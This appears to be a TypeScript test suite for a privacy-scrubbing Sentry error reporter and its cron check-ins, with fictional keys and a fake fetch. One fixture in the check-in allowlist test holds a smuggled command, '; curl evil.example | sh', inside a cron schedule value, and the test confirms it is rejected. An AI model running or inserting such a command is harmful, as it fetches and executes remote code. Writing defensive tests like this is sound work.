// Error reports from the relay and the push gateway (shared/src/sentry-report.ts, relay/src/report.ts): off without a
// key, the scrubber, the exact field list, limits, the relay log hook, crashes. Fictional keys and a fake fetch only:
// nothing here reaches Sentry.
import { describe, expect, test } from 'bun:test'
import {
  ErrorReporter, LONG_REPEAT_WINDOW_MS, ROUTE_VALUE_RE, TAG_VALUE_RE, buildEvent, checkIn, checkInUrl, cleanCheckInBody, cleanFingerprint, environmentName, parseDsn,
  parseStack, pauseSeconds, reportCrashes, reporterFromDsn, scrubText,
} from '../../shared/src/sentry-report.ts'
import { createRelayLog } from '../../relay/src/log.ts'
import { RELAY_VERSION } from '../../relay/src/relay.ts'
import { logLineInput, relayReportsFrom } from '../../relay/src/report.ts'

const DSN = 'https://0123abcd@o1.ingest.example.test/42'
const T0 = Date.UTC(2026, 10, 13)

function fakeFetch(status = 200, headers: Record<string, string> = {}) {
  const posts: { url: string; headers: Headers; body: string }[] = []
  const fetch = async (url: string, init: RequestInit) => {
    posts.push({ url, headers: new Headers(init.headers), body: String(init.body) })
    return new Response(null, { status, headers })
  }
  return { posts, fetch, events: () => posts.map((p) => JSON.parse(p.body.split('\n')[2]!) as Record<string, any>) }
}

describe('keys and check-in addresses', () => {
  test('parseDsn: https, a public key and a numeric project; a path prefix kept', () => {
    expect(parseDsn(DSN)).toEqual({ url: 'https://o1.ingest.example.test/api/42/envelope/', key: '0123abcd', base: 'https://o1.ingest.example.test', project: '42' })
    expect(parseDsn('https://k1@sentry.example.test/prefix/7')?.url).toBe('https://sentry.example.test/prefix/api/7/envelope/')
    for (const bad of [undefined, '', 'nope', 'http://k@o1.example.test/42', 'https://o1.example.test/42', 'https://k@o1.example.test/abc', 'https://k:secret@o1.example.test/42', 'https://k-y@o1.example.test/42']) expect(parseDsn(bad)).toBeNull()
  })

  test('checkInUrl: Sentry\'s HTTP check-in endpoint for a monitor slug', () => {
    expect(checkInUrl(DSN, 'relay-registry-backup')).toBe('https://o1.ingest.example.test/api/42/cron/relay-registry-backup/0123abcd/')
    expect(checkInUrl('https://k1@sentry.example.test:9000/prefix/7', 'relay-litestream')).toBe('https://sentry.example.test:9000/prefix/api/7/cron/relay-litestream/k1/')
    expect(checkInUrl(undefined, 'relay-litestream')).toBeNull()
    expect(checkInUrl(DSN, 'Bad Slug')).toBeNull()
    expect(checkInUrl(DSN, '../x')).toBeNull()
  })

  test('environment names: a short code, default production', () => {
    expect(environmentName(undefined)).toBe('production')
    expect(environmentName('')).toBe('production')
    expect(environmentName('staging')).toBe('staging')
    expect(environmentName('Prod Server!')).toBe('production')
  })
})

describe('no key: nothing is built, nothing is sent', () => {
  test('reporterFromDsn and relayReportsFrom without a key', () => {
    const f = fakeFetch()
    expect(reporterFromDsn(undefined, { release: 'x', environment: 'p', logger: 'relay', fetch: f.fetch })).toEqual({ reporter: null, invalid: false })
    expect(reporterFromDsn('   ', { release: 'x', environment: 'p', logger: 'relay', fetch: f.fetch })).toEqual({ reporter: null, invalid: false })
    expect(reporterFromDsn('not-a-key', { release: 'x', environment: 'p', logger: 'relay', fetch: f.fetch })).toEqual({ reporter: null, invalid: true })
    expect(relayReportsFrom({ RELAY_SENTRY_DSN: '' }, { fetch: f.fetch }).reporter).toBeNull()
    expect(relayReportsFrom({}, { fetch: f.fetch }).reporter).toBeNull()
    expect(f.posts).toEqual([])
  })

  test('the relay log without a hook writes the line and reports nothing', () => {
    const lines: string[] = []
    const log = createRelayLog((l) => lines.push(l))
    log.error('request_failed', { error: 'ECONNRESET' })
    expect(lines.length).toBe(1)
  })
})

describe('scrubbing', () => {
  const CANARIES = ['203.0.113.7', '2001:db8::1', '/var/lib/mycel-relay/registry.db', 'acme.treesoop.example', 'alice@example.test', 'fakekey_abcdefghijklmnopqrstuvwx', 's3cr3t-cookie', 'eyJhbGciOiJFUzI1NiJ9.payload.sig', '/t/acme/api/files?token=abc']
  test('addresses, paths, hosts, emails, secrets and long ids are taken out', () => {
    const msg = `connect 203.0.113.7 and 2001:db8::1 for /var/lib/mycel-relay/registry.db on acme.treesoop.example by alice@example.test with api_key=fakekey_abcdefghijklmnopqrstuvwx cookie: s3cr3t-cookie Authorization: Bearer eyJhbGciOiJFUzI1NiJ9.payload.sig GET /t/acme/api/files?token=abc`
    const out = scrubText(msg)
    for (const c of CANARIES) expect(out).not.toContain(c)
    expect(out).toContain('[ip]')
    expect(out).toContain('[path]')
    expect(out).toContain('Authorization=[redacted]')
    expect(scrubText('team name "회사" quoted')).toBe('team name [text] quoted')
    expect(scrubText('first line\nsecond line 203.0.113.7')).toBe('first line')
    expect(scrubText('x'.repeat(2000)).length).toBeLessThanOrEqual(300)
  })

  test('stack frames keep the last two parts of a file name and the code\'s own function names', () => {
    const stack = 'Error: boom\n    at handle (/opt/mycel-relay/releases/0.2.0/relay/src/relay.ts:10:5)\n    at async weird name ([eval]:1:1)\n    at node:internal/x:1:1'
    expect(parseStack(stack, 'boom')).toEqual([
      { filename: 'node:internal/x', function: '?', lineno: 1, colno: 1, in_app: false },
      { filename: '[file]', function: '?', lineno: 1, colno: 1, in_app: false },
      { filename: 'src/relay.ts', function: 'handle', lineno: 10, colno: 5, in_app: true },
    ])
  })

  test('an event holds exactly these fields', () => {
    const e = buildEvent({ type: 'RelayError', message: 'x', tags: { log_event: 'ops_error', bad: 'has space', 'Bad-Key': 'v' } }, { release: 'relay@0.2.0', environment: 'production', logger: 'relay', tags: { instance: 'a' }, now: T0 })
    expect(Object.keys(e).sort()).toEqual(['environment', 'event_id', 'exception', 'level', 'logger', 'platform', 'release', 'sdk', 'tags', 'timestamp'])
    expect(e.tags).toEqual({ instance: 'a', log_event: 'ops_error' })
    expect(e.level).toBe('error')
  })
})

describe('the relay', () => {
  test('error lines become reports with the event name and the scrubbed error only; forbidden fields never reach them', async () => {
    const f = fakeFetch()
    const { reporter } = relayReportsFrom({ RELAY_SENTRY_DSN: DSN, RELAY_SENTRY_ENV: 'staging', RELAY_INSTANCE: 'b' }, { fetch: f.fetch, now: () => T0 })
    const lines: string[] = []
    const log = createRelayLog((l) => lines.push(l), false, (ev, fields) => reporter!.capture(logLineInput(ev, fields)))
    log.info('team_connected', { team: 't_1' })
    log.warn('slow', { team: 't_1' })
    log.error('api_error', { error: 'no team at 203.0.113.7 /t/acme?token=abc', ip: '198.51.100.9', path: '/secret/path', headers: 'cookie: x', cookie: 'sid=1', team: 't_1234567890' })
    await reporter!.flush(1000)
    expect(lines.length).toBe(3)
    expect(f.posts.length).toBe(1)
    const p = f.posts[0]!
    expect(p.url).toBe('https://o1.ingest.example.test/api/42/envelope/')
    expect(p.headers.get('x-sentry-auth')).toContain('sentry_key=0123abcd')
    for (const s of ['203.0.113.7', '198.51.100.9', '/secret/path', '/t/acme', 'token=abc', 'cookie: x', 'sid=1', 't_1234567890']) expect(p.body).not.toContain(s)
    const [e] = f.events()
    expect(e!.release).toBe(`relay@${RELAY_VERSION}`)
    expect(e!.environment).toBe('staging')
    expect(e!.tags).toEqual({ instance: 'b', log_event: 'api_error' })
    expect(e!.exception.values[0].type).toBe('RelayError')
    expect(e!.exception.values[0].value).toBe('api_error: no team at [ip] [path]')
  })

  test('a log hook that throws never breaks the log', () => {
    const lines: string[] = []
    const log = createRelayLog((l) => lines.push(l), false, () => { throw new Error('x') })
    expect(() => log.error('ops_error', { error: 'TypeError' })).not.toThrow()
    expect(lines.length).toBe(1)
  })

  test('RELAY_INSTANCE outside a short code is left out', () => {
    const f = fakeFetch()
    const { reporter } = relayReportsFrom({ RELAY_SENTRY_DSN: DSN, RELAY_INSTANCE: 'a b/c' }, { fetch: f.fetch })
    reporter!.capture({ message: 'x' })
    return reporter!.flush(1000).then(() => expect(f.events()[0]!.tags).toEqual({}))
  })
})

describe('limits and crashes', () => {
  test('one copy of a repeated error a minute; at most 30 a minute; a crash always goes', async () => {
    const f = fakeFetch()
    let now = T0
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'relay@x', environment: 'production', logger: 'relay', fetch: f.fetch, now: () => now })
    r.capture({ message: 'same' })
    r.capture({ message: 'same' })
    for (let i = 0; i < 40; i++) r.capture({ message: `n${i}` })
    r.capture({ message: 'crash', fatal: true })
    await r.flush(1000)
    expect(f.posts.length).toBe(31)
    now += 61_000
    r.capture({ message: 'same' })
    await r.flush(1000)
    expect(f.posts.length).toBe(32)
  })

  test('Sentry\'s 429 pauses sending', async () => {
    const f = fakeFetch(429, { 'retry-after': '120' })
    let now = T0
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'relay', fetch: f.fetch, now: () => now })
    r.capture({ message: 'a' })
    await r.flush(1000)
    r.capture({ message: 'b' })
    now += 60_000
    r.capture({ message: 'c' })
    now += 61_000
    r.capture({ message: 'd' })
    await r.flush(1000)
    expect(f.events().map((e) => e.exception.values[0].value)).toEqual(['a', 'd'])
  })

  test('a network failure is swallowed', async () => {
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'relay', fetch: async () => { throw new Error('offline') } })
    expect(() => r.capture({ message: 'a' })).not.toThrow()
    await r.flush(1000)
  })

  test('a crash is reported as fatal, logged, and the process still exits with 1', async () => {
    const f = fakeFetch()
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'relay', fetch: f.fetch })
    const handlers = new Map<string, (e: unknown) => void>()
    const exits: number[] = []
    const logged: string[] = []
    const stderr: string[] = []
    reportCrashes(r, (what) => logged.push(what), { on: (ev, l) => handlers.set(ev, l), exit: (c) => exits.push(c), writeStderr: (t) => stderr.push(t) })
    const boom = new TypeError('boom at /home/alice/x.ts')
    handlers.get('uncaughtException')!(boom)
    handlers.get('unhandledRejection')!('ignored: already dying')
    await new Promise((d) => setTimeout(d, 50))
    expect(exits).toEqual([1])
    expect(logged).toEqual(['uncaught exception'])
    // the local log keeps what the runtime would have printed: the whole stack, message unscrubbed
    expect(stderr).toEqual([`${boom.stack}\n`])
    const [e] = f.events()
    expect(e!.level).toBe('fatal')
    expect(e!.exception.values[0]).toMatchObject({ type: 'TypeError', value: 'boom at [path]' })
    expect(f.posts[0]!.body).not.toContain('alice')
  })

  test('an unhandled rejection that is not an Error is printed as the runtime would', async () => {
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'relay', fetch: fakeFetch().fetch })
    const handlers = new Map<string, (e: unknown) => void>()
    const stderr: string[] = []
    const exits: number[] = []
    reportCrashes(r, () => {}, { on: (ev, l) => handlers.set(ev, l), exit: (c) => exits.push(c), writeStderr: (t) => stderr.push(t) })
    handlers.get('unhandledRejection')!('plain string reason')
    await new Promise((d) => setTimeout(d, 50))
    expect(stderr).toEqual(['unhandled rejection: plain string reason\n'])
    expect(exits).toEqual([1])
  })

  test('a long repeat window holds a repeating error out for an hour, then lets one through', async () => {
    const f = fakeFetch()
    let now = T0
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'push-gateway', fetch: f.fetch, now: () => now })
    const revoked = { type: 'CredentialRejected', message: 'refused', tags: { reason: 'oauth_400' }, repeatWindowMs: LONG_REPEAT_WINDOW_MS }
    r.capture(revoked)
    for (let m = 1; m < 60; m++) { now = T0 + m * 60_000; r.capture(revoked) }
    // a different reason is its own error
    r.capture({ ...revoked, tags: { reason: 'oauth_401' } })
    await r.flush(1000)
    expect(f.posts.length).toBe(2)
    now = T0 + LONG_REPEAT_WINDOW_MS
    r.capture(revoked)
    await r.flush(1000)
    expect(f.posts.length).toBe(3)
  })
})

const EV = { release: 'trina-cloud@abc', environment: 'production', logger: 'trina-cloud', tags: {}, now: T0 }

describe('options for the control plane: level, fingerprint, message events, kept Korean titles', () => {
  test('level: warning when asked, error by default, fatal wins', () => {
    expect(buildEvent({ message: 'x', level: 'warning' }, EV).level).toBe('warning')
    expect(buildEvent({ message: 'x' }, EV).level).toBe('error')
    expect(buildEvent({ message: 'x', level: 'warning', fatal: true }, EV).level).toBe('fatal')
    expect(buildEvent({ message: 'x', level: 'debug' as 'error' }, EV).level).toBe('error')
  })

  test('fingerprint: up to four code or route parts; one bad part or a fifth part and none is sent', () => {
    expect(buildEvent({ message: 'x', fingerprint: ['route-error', 'api', '/api/teams/:id', 'TypeError'] }, EV).fingerprint).toEqual(['route-error', 'api', '/api/teams/:id', 'TypeError'])
    expect(buildEvent({ message: 'x' }, EV)).not.toHaveProperty('fingerprint')
    for (const bad of [
      ['a', 'b', 'c', 'd', 'e'], [], ['job-failed', 'has space'], ['alert', '예약 작업 실패'], ['x', '/t/acme.example/files'],
      ['x', 'a/b'], ['x', ''], ['x', 'y'.repeat(65)], ['x', 42 as unknown as string],
    ]) {
      const e = buildEvent({ message: 'x', fingerprint: bad }, EV)
      expect(e).not.toHaveProperty('fingerprint')
    }
    expect(cleanFingerprint('job-failed')).toBeNull()
    for (const data of ['kim@acme.com', '10.0.0.1', '010-1234-5678', '900101-1234567', '2026-11-14', 'ghp_abcdefghijklmnopqrstuvwxyz0123456789', 'AKIAIOSFODNN7EXAMPLE', '0f8e1a2b-3c4d-4e5f-8a9b-0c1d2e3f4a5b', 'mor_revoke:sub_01HXYZ1234567890ABCDEFGH']) {
      expect(cleanFingerprint(['alert', data])).toBeNull()
    }
    for (const code of ['job-failed', 'InvalidProviderToken', 'ops_keys_unusable', '0.4.0', 'relay-0.2.0', 'task:daily-backup', '/api/teams/:teamId']) {
      expect(cleanFingerprint(['alert', code])).toEqual(['alert', code])
    }
    expect(Object.keys(buildEvent({ message: 'x', fingerprint: ['a'] }, EV)).sort()).toEqual(['environment', 'event_id', 'exception', 'fingerprint', 'level', 'logger', 'platform', 'release', 'sdk', 'tags', 'timestamp'])
  })

  test('a message event sends message.formatted, scrubbed, and no exception or frames', () => {
    const e = buildEvent({ kind: 'message', type: 'Alert', message: 'backup failed for alice@example.test at 203.0.113.7', stack: 'Error: x\n    at f (/opt/a/b.ts:1:1)', level: 'warning' }, EV)
    expect(Object.keys(e).sort()).toEqual(['environment', 'event_id', 'level', 'logger', 'message', 'platform', 'release', 'sdk', 'tags', 'timestamp'])
    expect(e.message).toEqual({ formatted: 'backup failed for [email] at [ip]' })
    expect(e.level).toBe('warning')
  })

  test('keepText keeps Hangul only; every other rule still runs', () => {
    expect(scrubText('예약 작업 실패: daily-backup', { keepText: true })).toBe('예약 작업 실패: daily-backup')
    expect(scrubText('예약 작업 실패: daily-backup')).toBe('[text] [text] [text]: daily-backup')
    const msg = `작업 실패 "김철수" '회사' alice@example.test https://acme.example/x?token=abc 203.0.113.7 2001:db8::1 /tank/ax/vm-1 acme.trina.app fakekey_abcdefghijklmnopqrstuvwx Bearer eyJhbGciOiJFUzI1NiJ9.payload.sig secret=hunter2 010-1234-5678 José 東京 😀`
    const out = scrubText(msg, { keepText: true })
    for (const leak of ['김철수', '회사', 'alice', 'acme', 'token=abc', '203.0.113.7', '2001:db8', '/tank', 'trina.app', 'fakekey', 'eyJ', 'hunter2', '1234', 'José', '東京', '😀']) expect(out).not.toContain(leak)
    expect(out.startsWith('작업 실패 [text] [text] [email] [url] [ip] [ip] [path] [name] [id] Bearer [redacted] secret=[redacted] [number]')).toBe(true)
    // only true opts in: a truthy value from data does not
    expect(scrubText('실패', { keepText: 'yes' as unknown as boolean })).toBe('[text]')
  })

  test('keepText: emails and hosts with a Korean domain, and Korean secret labels, are still taken out', () => {
    const k = { keepText: true }
    expect(scrubText('예약 작업 실패: 홍길동@회사.한국', k)).toBe('예약 작업 실패: [email]')
    expect(scrubText('mail to kim@example.한국 failed', k)).toBe('mail to [email] failed')
    expect(scrubText('host www.회사.한국 down', k)).toBe('host [name] down')
    for (const [msg, leak] of [['비밀번호: hunter2', 'hunter2'], ['비번=hunter2', 'hunter2'], ['암호 hunter2', 'hunter2'], ['토큰 deadbeefcafe1234', 'deadbeef'], ['인증번호는 482913', '482913'], ['토큰이 abcdef', 'abcdef']]) {
      expect(scrubText(msg!, k)).not.toContain(leak!)
      expect(scrubText(msg!)).not.toContain(leak!)
    }
    // a word that only starts like a label is not one
    expect(scrubText('암호화 실패', k)).toBe('암호화 실패')
  })

  test('keepText reaches the event only when the caller sets it', () => {
    const kept = buildEvent({ kind: 'message', message: '외부 점검 실패: relay-health', keepText: true }, EV)
    expect(kept.message).toEqual({ formatted: '외부 점검 실패: relay-health' })
    const plain = buildEvent({ kind: 'message', message: '외부 점검 실패: relay-health' }, EV)
    expect(plain.message).toEqual({ formatted: '[text] [text] [text]: relay-health' })
    expect((buildEvent({ message: '팀 홍길동 실패', keepText: true }, EV).exception as any).values[0].value).toBe('팀 홍길동 실패')
  })

  test('a whole event with every new option still leaks nothing from its input', () => {
    const e = buildEvent({
      kind: 'message', level: 'warning', keepText: true, message: '결제 실패 "홍길동" sub_ABCDEFGHIJKLMNOPQRSTUV polar order 01HXYZ1234567890ABCDEFGHJK alice@example.test',
      fingerprint: ['alert', 'mor_revoke:sub_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'], tags: { route: '/t/acme.example/api', team_id: 'alice@example.test b' },
    }, EV)
    const body = JSON.stringify(e)
    for (const leak of ['홍길동', 'sub_ABCDEF', '01HXYZ', 'alice', 'acme']) expect(body).not.toContain(leak)
  })

  test('the route tag takes a route pattern, never a real path; other tags stay codes', () => {
    const e = buildEvent({ message: 'x', tags: { route: '/api/teams/:id', method: 'GET', listener: 'api' } }, EV)
    expect(e.tags).toEqual({ route: '/api/teams/:id', method: 'GET', listener: 'api' })
    for (const ok of ['/', '/api/teams/:id', '/t/:slug/api/*', '/api/v1/hosts/:hostId?', '/api/admin/backups/']) expect(ROUTE_VALUE_RE.test(ok)).toBe(true)
    for (const real of [
      '/api/teams/123', '/api/teams/t_8f3a2b1c9d', '/t/acme.example/api', '/u/alice@example.test', '/files/Report', '/x/../etc', '//x',
      '/api/files?token=abc', '/a/b c', '/api/teams/0123456789abcdef0123456789abcdef', `/${'a'.repeat(25)}`, '/x/%2F', '/x/한글', '/api/203.0.113.7',
      '/a1b234/x', '/:ghp_ABCDEFGH1234567890abcdefghij', '/x/:id9', '/x/:Id',
    ]) {
      expect(ROUTE_VALUE_RE.test(real)).toBe(false)
      expect(buildEvent({ message: 'x', tags: { route: real } }, EV).tags).toEqual({})
    }
    // only the route tag: a slash in any other tag is still dropped, and TAG_VALUE_RE did not change
    expect(buildEvent({ message: 'x', tags: { step: '/api/teams/:id' } }, EV).tags).toEqual({})
    expect(TAG_VALUE_RE.test('/api/teams/:id')).toBe(false)
    expect(buildEvent({ message: 'x', tags: { route: `/${Array(50).fill('ab').join('/')}` } }, EV).tags).toEqual({})
  })

  test('a repeat with another fingerprint or level is its own report', async () => {
    const f = fakeFetch()
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'trina-cloud', fetch: f.fetch, now: () => T0 })
    r.capture({ message: 'same', fingerprint: ['a'] })
    r.capture({ message: 'same', fingerprint: ['a'] })
    r.capture({ message: 'same', fingerprint: ['b'] })
    r.capture({ message: 'same', fingerprint: ['b'], level: 'warning' })
    await r.flush(1000)
    expect(f.events().map((e) => [e.fingerprint, e.level])).toEqual([[['a'], 'error'], [['b'], 'error'], [['b'], 'warning']])
  })
})

describe('check-ins from code', () => {
  const ID = '0f8e1a2b-3c4d-4e5f-8a9b-0c1d2e3f4a5b'
  const BODY = {
    status: 'ok' as const, check_in_id: ID, duration: 12.5, environment: 'production',
    monitor_config: { schedule: { type: 'crontab' as const, value: '30 3 * * *' }, checkin_margin: 10, max_runtime: 30, timezone: 'Asia/Seoul', failure_issue_threshold: 2, recovery_threshold: 1 },
  }
  let dsnN = 100
  /** each test its own project, so a pause from one test does not reach the next */
  const freshDsn = () => `https://0123abcd@o1.ingest.example.test/${dsnN++}`

  test('posts the allowed fields as JSON to the monitor\'s check-in URL', async () => {
    const f = fakeFetch(202)
    const dsn = freshDsn()
    expect(await checkIn(dsn, 'cp-daily-backup', BODY, { fetch: f.fetch })).toBe('sent')
    expect(f.posts.length).toBe(1)
    expect(f.posts[0]!.url).toBe(checkInUrl(dsn, 'cp-daily-backup')!)
    expect(f.posts[0]!.headers.get('content-type')).toBe('application/json')
    expect(JSON.parse(f.posts[0]!.body)).toEqual(BODY)
  })

  test('the body is an allowlist: unknown fields and bad values are left out', () => {
    const dirty = {
      ...BODY, check_in_id: 'alice@example.test', duration: Number.NaN, environment: 'Prod Server', extra: 'alice@example.test', user: { email: 'a@b.c' },
      monitor_config: { ...BODY.monitor_config, timezone: 'alice@example.test', checkin_margin: -1, max_runtime: 1.5, owner: 'alice', failure_issue_threshold: 'x' },
    }
    expect(cleanCheckInBody(dirty)).toEqual({ status: 'ok', monitor_config: { schedule: { type: 'crontab', value: '30 3 * * *' }, recovery_threshold: 1 } })
    expect(cleanCheckInBody({ status: 'ok', monitor_config: { schedule: { type: 'crontab', value: '* * * * * ; curl evil.example | sh' } } })).toEqual({ status: 'ok' })
    expect(cleanCheckInBody({ status: 'in_progress', monitor_config: { schedule: { type: 'interval', value: 5, unit: 'minute' } } }))
      .toEqual({ status: 'in_progress', monitor_config: { schedule: { type: 'interval', value: 5, unit: 'minute' } } })
    expect(cleanCheckInBody({ status: 'ok', monitor_config: { schedule: { type: 'interval', value: 5, unit: 'fortnight' } } })).toEqual({ status: 'ok' })
    expect(cleanCheckInBody({ status: 'missed' })).toBeNull()
    expect(cleanCheckInBody(null)).toBeNull()
  })

  test('off without a key, a usable slug or a status: nothing is sent', async () => {
    const f = fakeFetch()
    expect(await checkIn(undefined, 'cp-x', BODY, { fetch: f.fetch })).toBe('off')
    expect(await checkIn('nope', 'cp-x', BODY, { fetch: f.fetch })).toBe('off')
    expect(await checkIn(freshDsn(), 'Bad Slug', BODY, { fetch: f.fetch })).toBe('off')
    expect(await checkIn(freshDsn(), 'cp-x', { status: 'nope' } as unknown as typeof BODY, { fetch: f.fetch })).toBe('off')
    expect(f.posts).toEqual([])
  })

  test('never throws: a network error, a timeout, an error answer, a fetch that throws at once', async () => {
    expect(await checkIn(freshDsn(), 'cp-x', BODY, { fetch: async () => { throw new Error('offline') } })).toBe('failed')
    expect(await checkIn(freshDsn(), 'cp-x', BODY, { fetch: () => { throw new Error('sync') } })).toBe('failed')
    expect(await checkIn(freshDsn(), 'cp-x', BODY, { fetch: fakeFetch(500).fetch })).toBe('failed')
    const hang = (_u: string, init: RequestInit) => new Promise<Response>((_, fail) => init.signal!.addEventListener('abort', () => fail(new Error('aborted'))))
    const started = Date.now()
    expect(await checkIn(freshDsn(), 'cp-x', BODY, { fetch: hang, timeoutMs: 30 })).toBe('failed')
    expect(Date.now() - started).toBeLessThan(2000)
    // a timeout that is not a number falls back to the default instead of failing
    expect(await checkIn(freshDsn(), 'cp-x', BODY, { fetch: fakeFetch(200).fetch, timeoutMs: Number.NaN })).toBe('sent')
  })

  test('a monitor rate limit or a 429 pauses check-ins to that project; an error-only limit does not', async () => {
    let now = T0
    const dsn = freshDsn()
    const limited = fakeFetch(200, { 'x-sentry-rate-limits': '120:monitor:key' })
    expect(await checkIn(dsn, 'cp-a', BODY, { fetch: limited.fetch, now: () => now })).toBe('sent')
    const f = fakeFetch()
    expect(await checkIn(dsn, 'cp-b', BODY, { fetch: f.fetch, now: () => now })).toBe('paused')
    // another project is not paused
    expect(await checkIn(freshDsn(), 'cp-b', BODY, { fetch: f.fetch, now: () => now })).toBe('sent')
    now += 121_000
    expect(await checkIn(dsn, 'cp-b', BODY, { fetch: f.fetch, now: () => now })).toBe('sent')

    const dsn2 = freshDsn()
    expect(await checkIn(dsn2, 'cp-a', BODY, { fetch: fakeFetch(200, { 'x-sentry-rate-limits': '120:error;default:key' }).fetch, now: () => now })).toBe('sent')
    expect(await checkIn(dsn2, 'cp-a', BODY, { fetch: f.fetch, now: () => now })).toBe('sent')

    const dsn3 = freshDsn()
    expect(await checkIn(dsn3, 'cp-a', BODY, { fetch: fakeFetch(429, { 'retry-after': '30' }).fetch, now: () => now })).toBe('failed')
    expect(await checkIn(dsn3, 'cp-a', BODY, { fetch: f.fetch, now: () => now })).toBe('paused')
  })

  test('pauseSeconds: errors by default (unchanged), monitor for check-ins, an empty category list for all', () => {
    expect(pauseSeconds('60:monitor:key', 200, null)).toBeNull()
    expect(pauseSeconds('60:error:key', 200, null)).toBe(60)
    expect(pauseSeconds('60:default:key', 200, null)).toBe(60)
    expect(pauseSeconds('60::key', 200, null)).toBe(60)
    expect(pauseSeconds('60:monitor:key', 200, null, ['monitor'])).toBe(60)
    expect(pauseSeconds('60:error:key', 200, null, ['monitor'])).toBeNull()
    expect(pauseSeconds('60:error;monitor:key, 90::org', 200, null, ['monitor'])).toBe(90)
  })

  test('an ErrorReporter is not paused by a monitor-only limit', async () => {
    const f = fakeFetch(200, { 'x-sentry-rate-limits': '600:monitor:key' })
    const r = new ErrorReporter(parseDsn(DSN)!, { release: 'x', environment: 'production', logger: 'trina-cloud', fetch: f.fetch, now: () => T0 })
    r.capture({ message: 'a' })
    await r.flush(1000)
    r.capture({ message: 'b' })
    await r.flush(1000)
    expect(f.posts.length).toBe(2)
  })
})
